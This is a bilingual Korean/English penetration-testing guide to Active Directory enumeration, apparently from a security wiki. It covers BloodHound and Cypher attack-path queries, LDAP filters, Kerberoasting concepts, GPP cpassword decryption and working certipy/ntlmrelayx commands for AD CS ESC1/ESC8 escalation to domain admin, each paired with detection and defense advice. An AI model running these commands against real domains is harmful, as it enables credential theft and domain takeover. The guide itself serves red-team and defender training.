**탐지/방어**: MS14-025 패치 이후에도 남아있는 레거시 `Groups.xml`/`Services.xml`/`ScheduledTasks.xml`을 SYSVOL 전수 스캔으로 찾아 제거하고, 그 안에 있던 비밀번호는 이미 유출된 것으로 간주해 즉시 교체한다. SYSVOL에 대한 비정상적인 대량 파일 열람(특히 일반 사용자 계정의 짧은 시간 내 다수 XML 접근)은 이벤트 로그·파일 접근 감사(SACL)로 탐지할 수 있다.

### 6.5 AD CS(인증서 서비스) 오남용 — ESC1 / ESC8

AD Certificate Services(ADCS)는 잘못 설정된 인증서 템플릿이나 웹 등록 엔드포인트가 있으면 일반 사용자를 도메인 관리자로 격상시키는 통로가 된다. 가장 널리 알려진 두 경로는 다음과 같다.

- **ESC1**: 템플릿이 `ENROLLEE_SUPPLIES_SUBJECT`(요청자가 SAN을 직접 지정 가능) + 클라이언트 인증 EKU + 낮은 권한 계정의 등록 권한을 동시에 허용하면, 공격자가 SAN을 `administrator`로 지정한 인증서를 발급받아 그대로 도메인 관리자로 인증할 수 있다.
- **ESC8**: CA의 웹 등록 인터페이스(`/certsrv`)가 HTTP + NTLM 인증만 지원하면, NTLM 릴레이로 피해자의 인증을 CA 웹 등록으로 릴레이해 피해자 명의의 인증서를 강제로 발급받을 수 있다.

```bash
# 1) 취약한 템플릿 탐색 (certipy)
pip install certipy-ad
certipy find -u alice@corp.local -p Password123 -dc-ip 10.10.10.100 -vulnerable

# 2) ESC1 — 임의 사용자(administrator) 명의 인증서 요청
certipy req -u alice@corp.local -p Password123 -dc-ip 10.10.10.100 \
  -ca corp-CA -template VulnerableTemplate -upn administrator@corp.local

# 3) 발급받은 인증서로 PKINIT 인증 → TGT 및 NT 해시 획득
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100

# 4) ESC8 — NTLM 릴레이를 웹 등록 엔드포인트로
ntlmrelayx.py -t http://ca-server.corp.local/certsrv/certfnsh.asp \
  --adcs --template DomainController
```

**탐지/방어**: `certipy find`로 정기적으로 자체 템플릿을 감사해 `ENROLLEE_SUPPLIES_SUBJECT` + 클라이언트 인증 EKU + 광범위한 등록 권한이 함께 부여된 템플릿을 찾아 즉시 수정한다. CA 웹 등록은 HTTPS + Extended Protection for Authentication(EPA) 강제 또는 아예 비활성화하고, LDAP·LDAPS 채널 바인딩도 함께 강제한다. 인증서 발급 이벤트(CA 로그, 이벤트 4886/4887)에서 평소 발급 이력이 없는 계정이 상급 SAN으로 인증서를 발급받는 패턴을 모니터링한다.

---

## 7. 참고 도구

| 도구 | 용도 |
|------|------|
| `BloodHound` | AD 공격 경로 시각화 |
| `SharpHound` | BloodHound 데이터 수집 |
| `bloodhound-python` | Linux에서 BloodHound 수집 |
| `ldapdomaindump` | LDAP 데이터 HTML 덤프 |
| `CrackMapExec` / `NetExec` | SMB·AD 대량 열거 |
| `rpcclient` | RPC 기반 AD 열거 |
| `enum4linux-ng` | Linux SMB/AD 열거 |
| `ADRecon` | 포렌식 친화적 AD 정보 수집 |
| `gpp-decrypt` | SYSVOL cpassword 복호화 |
| `certipy-ad` | AD CS 템플릿 취약점 탐색·악용 |

---

<!-- detect-validate-54 -->
## 공격 탐지와 방어 검증

AD 공격은 *어떻게 도메인을 장악하는가*를 다루지만, 방어자 관점에서는 **그 기법이 Windows 보안 이벤트에 남는가**와 **통제가 실제로 막는가**를 검증해야 한다. 공격자도 이 관점으로 어떤 통제가 실효적인지 가늠할 수 있다.

### 공격 → 완화 계층 → 통제(방어자) → 탐지 신호

| 기법 | 노리는 완화 | 1차 통제(예방) | 탐지 신호 |
|---|---|---|---|
| BloodHound 수집(SharpHound) | - | 허니 객체, LDAP 감사 | EID 4662 광범위 객체 접근, 대량 세션 열거 |
| LDAP 정찰 | - | LDAP 속도 제한, 디렉터리 감사 | 짧은 시간 대량 디렉터리 질의 |
| SPN 열거 | - | SPN 모니터링 | `GetUserSPNs` 류 질의 패턴 |

### 방어 검증 (직접 확인)

```powershell
# 1) 디렉터리 서비스 접근 감사가 켜져 EID 4662 를 남기는지 확인
auditpol /get /subcategory:"Directory Service Access"
# 2) BloodHound 수집 시의 광범위 객체 접근이 로그에 잡히는지
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4662} -MaxEvents 20
# 비정상적으로 광범위한 객체 접근 패턴이면 SharpHound 정찰 의심
```

> 검증은 반드시 **소유한 시스템·통제된 환경**에서만 수행한다. 완화를 "설정했다"와 "런타임에 실제 막힌다"는 다르다 — PoC 를 재현해 완화가 차단하는지 확인해야 신뢰할 수 있다([[68_Purple_Team]]).

**최신 기법·통제 (2025–2026):**
- BloodHound/SharpHound로 공격경로 그래프화가 표준 — 검증: 노출된 공격경로가 티어링·최소권한으로 차단되는지 재현(소유 도메인)([[03_System_Hacking]])
- 정찰 트래픽 탐지 — 강제되는지 확인

---


<a name="english"></a>

# Active Directory Enumeration — BloodHound, LDAP, and Automation

## 0. Active Directory for Beginners

### 0.1 What is Active Directory? (The Company Phone Book Analogy)

Active Directory can feel overwhelming at first. The best analogy is a **"company phone book combined with an access control system."**

```
[Real World Analogy]

Company building       = Domain (corp.local)
 ├── Employee roster   = User accounts
 ├── Department list   = Groups
 ├── Room keys         = Permissions / ACLs
 ├── Security desk     = Domain Controller (DC)
 └── Building directory = LDAP directory service

What the security desk (DC) does:
  - Employee presents badge (password) → checks roster → allow/deny
  - Centrally manages all room keys
  - Automatically updates permissions when someone changes departments
```

In real enterprise environments, Active Directory:
- Manages thousands of employee accounts from a single place
- Lets you log in from any computer with the same credentials
- Integrates authentication across file servers, email, and business apps

**Attacker's perspective:** Compromising AD means controlling the entire corporate IT infrastructure. That is why AD is the ultimate target for red teams and the most critical asset for defenders.

### 0.2 Domain, Forest, and OU Structure

```
[AD Hierarchy]

Forest (top-level boundary)
└── Domain: corp.local
    ├── Child domain: asia.corp.local
    │   └── Grandchild: kr.asia.corp.local
    └── OUs (like folders in a filing cabinet)
        ├── OU=Seoul-Office
        │   ├── OU=Engineering
        │   │   ├── user: alice (alice@corp.local)
        │   │   └── user: bob
        │   └── OU=Sales
        └── OU=Servers
            ├── computer: WEB01
            └── computer: DB01
```

| Concept | Description | Analogy |
|---------|-------------|---------|
| Forest | Top-level collection of all domains | Corporate group |
| Domain | Security boundary unit | Subsidiary company |
| OU | Organizational unit within a domain | Department |
| Trust | Trust relationship between domains | Inter-subsidiary agreement |
| DC | Domain Controller — the authentication server | Security desk |
| GPO | Group Policy Object — domain-wide settings | Company policy manual |

### 0.3 What is LDAP?

LDAP (Lightweight Directory Access Protocol) is the **"query language"** for Active Directory. Just like searching a company phone book for "all engineers in the Seoul office," LDAP filters let you search AD for exactly the objects you need.

```
[LDAP Concepts]

DN (Distinguished Name) = full path to an object:
  CN=Alice,OU=Engineering,OU=Seoul-Office,DC=corp,DC=local
   │          │                  │              │
  Name      Department         Office         Domain

LDAP Filter Syntax:
  (objectClass=user)               → all user objects
  (sAMAccountName=alice)           → account named alice
  (&(objectClass=user)(mail=*))    → users that have email
  (|(cn=alice)(cn=bob))            → alice OR bob
  (!(objectClass=computer))        → exclude computers
```

---

## 1. AD Attack Roadmap

```
Initial Access
    │
    ▼
AD Enumeration ←── Start here
    │  - Domain info, users, groups, computers
    │  - Trust relationships, GPOs, ACLs
    ▼
Kerberos Attacks
    │  - Kerberoasting, AS-REP Roasting
    ▼
Lateral Movement
    │  - Pass-the-Hash, Pass-the-Ticket
    │  - NTLM Relay, DCSync
    ▼
Domain Dominance
       - Golden Ticket, Silver Ticket
       - AdminSDHolder, ACL abuse
```

---

## 2. Basic AD Enumeration Commands

### 2.1 PowerShell-based

Key enumeration commands:
- `Get-ADUser -Filter * -Properties *` — enumerate all domain users with full attributes
- `Get-ADGroupMember "Domain Admins" -Recursive` — list members of privileged groups
- `Get-ADDomainController -Filter *` — discover domain controllers
- `Get-ADUser -Filter {ServicePrincipalName -ne "$null"}` — find Kerberoasting targets (accounts with SPNs)
- `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` — find AS-REP Roasting targets (pre-auth not required)
- `Get-GPO -All` — enumerate Group Policy Objects

### 2.2 LDAP Queries (Linux)

Using `ldapsearch` from Linux without domain membership:
- Anonymous enumeration to discover naming contexts
- Authenticated user/SPN enumeration via LDAP filters
- LDAP filter `(&(servicePrincipalName=*)(objectClass=user))` finds Kerberoastable accounts

### 2.3 LDAP Filter Quick Reference

| Purpose | LDAP Filter |
|---------|-------------|
| All users | `(&(objectClass=user)(objectCategory=person))` |
| Enabled accounts only | `(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))` |
| Accounts with SPNs | `(&(objectClass=user)(servicePrincipalName=*))` |
| Pre-auth not required | `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` |
| Password never expires | `(userAccountControl:1.2.840.113556.1.4.803:=65536)` |
| All computers | `(objectClass=computer)` |
| Domain Controllers | `(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))` |

---

## 3. BloodHound Collection and Analysis

### 3.1 What is BloodHound?

BloodHound visualizes AD attack paths using a **graph database (Neo4j)**. It answers questions like: "Is there any path from a regular user account to Domain Admin?"

```
[BloodHound workflow]

Collect AD data (SharpHound / bloodhound-python)
        │
        ▼
Import into Neo4j graph database
        │
        ▼
Visualize + query with Cypher to find attack paths

Example: "Does a path exist from 'alice' to Domain Admin?"
  alice → local admin on WEB01 → DA has session on WEB01 → DA credentials
```

### 3.2 BloodHound Setup (Step by Step)

```bash
# Install Neo4j (Ubuntu/Debian)
sudo apt install -y openjdk-11-jdk
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable latest' | sudo tee /etc/apt/sources.list.d/neo4j.list
sudo apt update && sudo apt install -y neo4j
sudo systemctl start neo4j

# Change default password via http://localhost:7474
# Default: neo4j / neo4j

# BloodHound CE via Docker (recommended)
git clone https://github.com/SpecterOps/BloodHound.git
cd BloodHound
docker compose up -d
# Access: http://localhost:8080
```

### 3.3 SharpHound Collection Methods

| Method | Description | Network Noise | When to Use |
|--------|-------------|--------------|-------------|
| `Default` | Sessions, local admins, groups | Medium | Standard assessment |
| `All` | Everything (Default + ACLs + ObjectProps) | High | When noise is acceptable |
| `DCOnly` | LDAP queries to DC only | Low | Stealth collection |
| `Session` | Active logon sessions only | Very High | Need session data |
| `ACL` | ACL data only | Low | Focus on permission analysis |

```bash
# Linux collection (no domain join required)
pip install bloodhound
bloodhound-python -u user@domain.local -p Password \
  -ns 10.10.10.100 -d domain.local -c all --zip -o /tmp/bloodhound/
```

### 3.4 BloodHound Cypher Queries

```cypher
// Shortest path to Domain Admins from owned accounts
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

// Kerberoastable accounts
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

// AS-REP Roastable accounts
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

// Accounts with DCSync rights
MATCH (n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN n.name, d.name

// Password never expires (active)
MATCH (u:User {pwdneverexpires:true, enabled:true}) RETURN u.name

// Trust relationship map
MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain) RETURN d1.name, r.trusttype, d2.name
```

### 3.5 Advanced Cypher Queries with Explanations

```cypher
// All paths (not just shortest) from owned to DA — up to 10 hops
MATCH p=allShortestPaths(
  (u:User {owned:true})-[*1..10]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
)
RETURN p

// Dangerous ACL relationships — attacker can change passwords or grant permissions
MATCH (u:User)-[r:GenericAll|WriteDACL|WriteOwner|GenericWrite]->(c)
WHERE u.enabled = true
RETURN u.name, type(r), c.name
ORDER BY u.name

// Kerberoastable accounts that are also in admin groups
MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "ADMIN"
RETURN u.name, u.serviceprincipalnames, g.name

// Computers where Domain Admins have active sessions
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
RETURN c.name, u.name
// Explanation: DA logged onto a computer = credentials potentially in memory

// Trust relationships and their properties
MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain)
RETURN d1.name, r.trusttype, r.transitive, d2.name
// Transitive trusts allow crossing multiple domain boundaries
```

---

## 4. AD Auto Enumeration CLI

The `ADEnumerator` class connects to a Domain Controller via NTLM authentication over LDAP/LDAPS and performs systematic enumeration:

**`enum_users()`** — all user accounts with account control flags, last logon timestamps, and group memberships

**`enum_spn_accounts()`** — accounts with SPNs registered (Kerberoasting targets) using LDAP filter `(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))`

**`enum_asrep_accounts()`** — accounts with `DONT_REQ_PREAUTH` flag (userAccountControl bit 4194304) set — AS-REP Roasting targets

**`enum_computers()`** — all computer accounts with OS information and last logon

**Usage:**
```bash
python3 ad_enum.py 10.10.10.100 corp.local -u lowpriv -p Password123 --tls -o enum_results.json
```

---

## 5. AD Misconfiguration Finder

The `ADMisconfigFinder` performs systematic LDAP-based checks for common Active Directory misconfigurations:

**`check_kerberoastable()`** — finds user accounts with SPNs (Kerberoasting targets), reports password age

**`check_asrep_roastable()`** — finds accounts with pre-authentication disabled (AS-REP Roasting targets)

**`check_password_never_expires()`** — identifies accounts with `DONT_EXPIRE_PASSWORD` flag, especially privileged ones

**`check_admin_count()`** — detects excessive number of protected accounts (`adminCount=1`)

**`check_stale_accounts(days=90)`** — finds enabled accounts with no login in 90+ days

**Usage:**
```bash
python3 ad_misconfig_finder.py 10.10.10.100 corp.local -u alice -p Pass123 -o report.json
```

---

## 6. Common AD Misconfigurations Explained

### 6.1 Why Kerberoasting Works

```
[Kerberoasting explained]

Normal flow:
  User → KDC: "I want to access the SQL server"
  KDC → "Here is a ticket encrypted with the SQL service account hash"
  User → SQL Server: presents ticket → access granted

Attacker flow:
  Attacker → KDC: "I want to access the SQL server" (completely legitimate request!)
  KDC → encrypted ticket (using service account hash)
  Attacker → cracks the ticket offline → recovers service account password!

The problem: This is a fully legitimate Kerberos request — hard to distinguish from normal
```

### 6.2 Why AS-REP Roasting Works

```
[AS-REP Roasting explained]

Normal Kerberos pre-authentication:
  Client → KDC: "I am alice" + encrypted timestamp (proves identity)
  KDC: validates timestamp, issues TGT

When pre-auth is disabled:
  Attacker → KDC: "I am alice" (no proof required!)
  KDC: sends back response encrypted with alice's hash
  Attacker: cracks response offline → recovers alice's password!

Analogy: Imagine calling a reception desk and asking for "Alice's extension"
         and they just read it out without verifying who you are
```

### 6.3 Misconfiguration Risk Summary

| Misconfiguration | Risk | Attack | Detection |
|-----------------|------|--------|-----------|
| SPN on regular user | HIGH | Kerberoasting | Event 4769, RC4 encryption requests |
| Pre-auth disabled | HIGH | AS-REP Roasting | Event 4768 |
| Too many domain admins | HIGH | Direct privilege abuse | Admin group membership audit |
| AdminSDHolder modified | HIGH | ACL-based persistence | Event 5136 |
| DCSync rights over-granted | CRITICAL | DCSync | Event 4662 |
| No password policy | MEDIUM | Brute force | Account lockout threshold check |
| LAPS not deployed | MEDIUM | Local admin hash reuse | LAPS deployment status |
| SMB signing disabled | HIGH | NTLM relay | SMB signing policy check |

### 6.4 GPP (Group Policy Preferences) Credential Exposure — cpassword

Legacy GPP could store a local account password (for logon scripts, scheduled tasks, drive mappings) AES-256-encrypted inside a group policy. The catch: Microsoft **published that AES key in public MSDN documentation**. MS14-025 stopped new passwords from being pushed this way, but many older domains still have leftover `Groups.xml` files sitting in SYSVOL. Since SYSVOL is readable by any authenticated domain user, a single low-privilege account is enough to decrypt a local administrator password instantly.

```bash
# 1) Find XML files containing cpassword in SYSVOL (a regular authenticated user is enough)
smbclient -U 'corp.local/alice%Password123' //10.10.10.100/SYSVOL -c \
  'recurse; ls' 2>/dev/null | grep -i xml

# or search directly after mounting
find /mnt/sysvol -iname 'Groups.xml' -o -iname 'Services.xml' -o -iname 'ScheduledTasks.xml' \
  2>/dev/null | xargs grep -l cpassword

# 2) Decrypt with the publicly known AES key (built into Kali)
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83njW+iuoU9jhr5CGFvW0'

# 3) PowerShell equivalent (PowerSploit-style)
# Get-GPPPassword.ps1
```

**Detection/Defense**: Sweep SYSVOL for leftover `Groups.xml` / `Services.xml` / `ScheduledTasks.xml` even after applying MS14-025, remove them, and treat any password that was ever stored there as already compromised — rotate it immediately. Unusual bulk file access to SYSVOL (especially many XML reads by a regular user account in a short window) can be caught with file-access auditing (SACL) and event log monitoring.

### 6.5 AD CS (Certificate Services) Abuse — ESC1 / ESC8

AD Certificate Services becomes a path to domain admin when certificate templates or the web enrollment endpoint are misconfigured. The two most well-known escalation paths:

- **ESC1**: if a template allows `ENROLLEE_SUPPLIES_SUBJECT` (the requester can specify the SAN) plus a client-authentication EKU plus enrollment rights for a low-privileged principal, an attacker can request a certificate with the SAN set to `administrator` and authenticate as a domain admin with it.
- **ESC8**: if the CA's web enrollment interface (`/certsrv`) only supports HTTP + NTLM authentication, an attacker can NTLM-relay a victim's authentication into the web enrollment endpoint and obtain a certificate issued in the victim's name.

```bash
# 1) Find vulnerable templates (certipy)
pip install certipy-ad
certipy find -u alice@corp.local -p Password123 -dc-ip 10.10.10.100 -vulnerable

# 2) ESC1 — request a certificate impersonating an arbitrary user (administrator)
certipy req -u alice@corp.local -p Password123 -dc-ip 10.10.10.100 \
  -ca corp-CA -template VulnerableTemplate -upn administrator@corp.local

# 3) Authenticate via PKINIT with the issued cert -> get a TGT and the NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100

# 4) ESC8 — NTLM-relay to the web enrollment endpoint
ntlmrelayx.py -t http://ca-server.corp.local/certsrv/certfnsh.asp \
  --adcs --template DomainController
```

**Detection/Defense**: Regularly audit your own templates with `certipy find` and fix any template that combines `ENROLLEE_SUPPLIES_SUBJECT`, a client-auth EKU, and broad enrollment rights. Enforce HTTPS + Extended Protection for Authentication (EPA) on CA web enrollment, or disable it outright, and enforce LDAP/LDAPS channel binding alongside it. Monitor certificate issuance events (CA logs, event IDs 4886/4887) for accounts with no prior issuance history suddenly obtaining certificates with elevated SANs.

---

## 7. Reference Tools

| Tool | Purpose |
|------|---------|
| `BloodHound` | AD attack path visualization |
| `SharpHound` | BloodHound data collection (Windows) |
| `bloodhound-python` | BloodHound collection from Linux |
| `ldapdomaindump` | LDAP data HTML dump |
| `CrackMapExec` / `NetExec` | SMB and AD bulk enumeration |
| `rpcclient` | RPC-based AD enumeration |
| `enum4linux-ng` | Linux SMB/AD enumeration |
| `ADRecon` | Forensic-friendly AD information collection |
| `gpp-decrypt` | Decrypt SYSVOL cpassword values |
| `certipy-ad` | Find and exploit AD CS template misconfigurations |
| `Impacket GetUserSPNs.py` | Kerberoasting |
| `Impacket GetNPUsers.py` | AS-REP Roasting |

---

## Attack Detection and Defense Validation

AD attacks cover *how* you take over a domain, but from the defender's side you must verify **whether the technique surfaces in Windows security events** and **whether the control actually blocks it**. Attackers can use this lens too, to judge which controls are real obstacles.

### Attack -> mitigation layer -> control (defender) -> detection signal

| Technique | Targeted mitigation | Primary control (prevention) | Detection signal |
|---|---|---|---|
| BloodHound collection (SharpHound) | - | Honey objects, LDAP audit | EID 4662 broad object access, mass session enumeration |
| LDAP recon | - | LDAP rate limiting, directory audit | High-volume directory queries in a short window |
| SPN enumeration | - | SPN monitoring | `GetUserSPNs`-style query pattern |

### Defense validation (verify yourself)

```powershell
# 1) Confirm Directory Service Access auditing is on and emits EID 4662
auditpol /get /subcategory:"Directory Service Access"
# 2) Confirm the broad object access from BloodHound collection appears in logs
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4662} -MaxEvents 20
# An abnormally broad object-access pattern suggests SharpHound recon
```

> Run validation only on **systems you own, in a controlled environment**. "Configured" is not the same as "blocked at runtime" -- reproduce the PoC and confirm the mitigation stops it (see [[68_Purple_Team]]).
